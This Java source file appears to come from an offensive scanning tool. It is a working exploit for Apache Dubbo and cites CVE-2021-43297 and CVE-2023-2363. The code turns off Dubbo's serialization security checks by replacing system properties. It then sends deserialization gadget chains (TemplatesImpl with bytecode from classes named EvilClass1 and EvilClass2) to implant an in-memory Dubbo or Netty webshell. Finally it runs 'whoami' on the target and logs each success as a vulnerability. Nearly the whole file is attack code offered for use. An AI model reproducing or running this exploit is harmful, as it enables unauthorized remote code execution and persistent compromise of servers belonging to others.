package scanner.exploit;

import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.io.UnsafeByteArrayOutputStream;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;
import org.apache.dubbo.rpc.service.GenericService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import scanner.scan.AbstractScanner;
import scanner.scan.DubboScaner;
import scanner.utils.Configuration;
import scanner.utils.Socket;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static scanner.scan.DubboScaner.*;


public class DubboExploiter implements AbstractExploiter {

    private Logger logger = LoggerFactory.getLogger(getClass());
    public static final String CMD_PREFIX = "CMD:";
    public static final String CMD_SPLIT = "@cmdEcho@";

    private Map getCmd() {
        HashMap map = new HashMap();
        map.put("class", CMD_PREFIX + "uwhoami");
        return map;
    }

    private String getCmdRet(String data) {
        String regex = "(?s)" + CMD_SPLIT + "(.*?)" + CMD_SPLIT;
        String result = "";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(data.toString());
        if (matcher.find()) {
            result = matcher.group(1);
            logger.info("执行命令结果:\n" + result);
        }
        return result;
    }

    private static Map getProperties() throws IOException {
        Properties properties = new Properties();
        properties.setProperty("dubbo.security.serialize.generic.native-java-enable", "true");
        properties.setProperty("serialization.security.check", "false");
        HashMap map = new HashMap();
        map.put("class", "java.lang.System");
        map.put("properties", properties);
        return map;
    }

    public String sendPoc(Object obj, String generic, DubboScaner scaner) {
        try {
            Object[] args;
            String tmpUrl = scaner.url;
            ReferenceConfig<GenericService> referenceConfig = new ReferenceConfig<>();
            referenceConfig.setRetries(0);
            referenceConfig.setTimeout(100000);
            referenceConfig.setApplication(new ApplicationConfig("test"));
            referenceConfig.setInterface(scaner.interFace);
            referenceConfig.setUrl(tmpUrl);
            referenceConfig.setGeneric(generic);
            referenceConfig.setVersion(scaner.version);
            GenericService genericService = referenceConfig.get();

            ArrayList<Object> args1 = new ArrayList<>();
            args1.add(obj);
            for (int i = 1; i < scaner.parameters.length; i++) {
                if (generic.equals(NATIVE_JAVA)) {
                    args1.add(obj);
                } else {
                    args1.add(null);
                }

            }
            try {
                genericService.$invoke(scaner.method, scaner.parameters, args1.toArray());
            } catch (org.apache.dubbo.rpc.RpcException e) {
                return e.getMessage();
            } finally {
                referenceConfig.destroy();
            }

        } catch (Exception e) {
            return e.getMessage();
        }
        return "";
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    //CVE-2021-43297
    public static byte[] getObject2() {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get("scanner.utils.EvilClass2");
            clazz.defrost();
            clazz.getClassFile().setMajorVersion(51);
            CtClass tmp = pool.makeClass("exp2" + System.nanoTime());
            byte[][] bytes = new byte[][]{clazz.toBytecode(), tmp.toBytecode()};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setValue(templates, "_bytecodes", bytes);
            setValue(templates, "_name", "");
            setValue(templates, "_transletIndex", 0);
            setValue(templates, "_tfactory", null);

            JSONArray jsonArray = new JSONArray();
            jsonArray.add(templates);

            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            setValue(val, "val", jsonArray);

            HashMap hashMap = new HashMap();
            hashMap.put(templates, val);

            ByteArrayOutputStream payload = new ByteArrayOutputStream();
            Hessian2Output outBinding = new Hessian2Output(payload);
            outBinding.writeObject(hashMap);
            outBinding.flushBuffer();
            return payload.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(0);
        }
        return null;
    }


    public static byte[] getObject() {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get("scanner.utils.EvilClass1");
            clazz.defrost();
            clazz.getClassFile().setMajorVersion(51);

            CtClass tmp = pool.makeClass("exp1" + System.nanoTime());
            byte[][] bytes = new byte[][]{clazz.toBytecode(), tmp.toBytecode()};
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setValue(templates, "_bytecodes", bytes);
            setValue(templates, "_name", "");
            setValue(templates, "_transletIndex", 0);
            setValue(templates, "_tfactory", null);

            JSONArray jsonArray = new JSONArray();
            jsonArray.add(templates);

            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            setValue(val, "val", jsonArray);

            HashMap hashMap = new HashMap();
            hashMap.put(templates, val);
            NativeJavaSerialization nativeJavaSerialization = new NativeJavaSerialization();
            UnsafeByteArrayOutputStream payload = new UnsafeByteArrayOutputStream();
            ObjectOutput o = nativeJavaSerialization.serialize(null, payload);
            o.writeObject(hashMap);
            return payload.toByteArray();

        } catch (Exception e) {
            e.printStackTrace();
            System.exit(0);
        }
        return null;
    }

    public String exploitForNoMethod(AbstractScanner scanner) {
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] header = new byte[16];
            Bytes.short2bytes((short) 0xdabb, header);
            header[2] = 2;
            Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

            byte[] ser = getObject2();
            Bytes.int2bytes(ser.length, header, 12);
            byteArrayOutputStream.write(header);
            byteArrayOutputStream.write(ser);

            byte[] bytes = byteArrayOutputStream.toByteArray();
            Socket.sendOne(scanner.getIp(), scanner.getPort(), bytes);
            HttpResponse result = HttpUtil.createPost(String.format("http://%s:%d/dubbo.jsp", scanner.getIp(), scanner.getPort())).body("whoami").timeout(Configuration.timeout).execute();
            if (result.getStatus() == 200) {
                return result.body();
            }
        } catch (Exception e) {
        }
        return "";
    }

    @Override
    public void exploit(AbstractScanner scanner) {
        //如果目标存在方法名和参数类型，则利用CVE-2023-2363尝试利用，在没有获取到详细信息或者前者利用失败的情况下，尝试利用CVE-2021-43297植入Netty内存马
        if (scanner instanceof DubboScaner) {
            DubboScaner s = (DubboScaner) scanner;
            for (String service : s.dubboInfo.keySet()) {
                if (s.dubboInfo.get(service).getMethods().size() > 0) {
                    for (Object j : s.dubboInfo.get(service).getMethods()) {
                        JSONObject tmp = (JSONObject) j;
                        if (tmp.get("parameterTypes") != null) {
                            s.method = (String) tmp.get("name");
                            s.parameters = ((JSONArray) tmp.get("parameterTypes")).toArray(new String[]{});
                            s.interFace = service;
                            break;
                        }
                    }
                }
            }
            if (s.method == null || s.parameters.length == 0) {
                logger.info(String.format("%s:%d 植入Dubbo内存马失败,尝试植入Netty内存马", s.getIp(), s.getPort()));
                String ret = exploitForNoMethod(s);
                if (ret.length() > 0) {
                    logger.info(String.format("[VULN] %s:%d成功植入Dubbo内存马,执行whoami结果如下\n%s", s.getIp(), s.getPort(), ret));
                }
            } else {
                try {
                    logger.info(String.format(String.format("%s:%d 尝试植入Dubbo内存马", s.getIp(), s.getPort())));
                    sendPoc(getProperties(), RAW, s);// 替换系统Properties
                    sendPoc(getObject(), NATIVE_JAVA, s);// 发送恶意字节码
                    String cmdRet = sendPoc(getCmd(), RAW, s);
                    if (cmdRet.contains(CMD_SPLIT)) {
                        logger.info(String.format("[VULN] %s:%d 成功植入Dubbo内存马,执行whoami结果如下", s.getIp(), s.getPort()));
                        getCmdRet(cmdRet);
                    }
                } catch (Exception e) {
//                    e.printStackTrace();
                }
            }
        }
    }

    public static void main(String[] args) throws Exception {
        DubboScaner s = new DubboScaner("127.0.0.1", 20880);
        s.url = "dubbo://127.0.0.1:20880/com.api.testService";
        s.method = "hi";
        s.interFace = "com.api.testService";
        s.version = null;
        s.parameters = new String[]{"java.lang.Object", "java.util.Map"};
        DubboExploiter d = new DubboExploiter();
        d.exploit(s);
    }
}
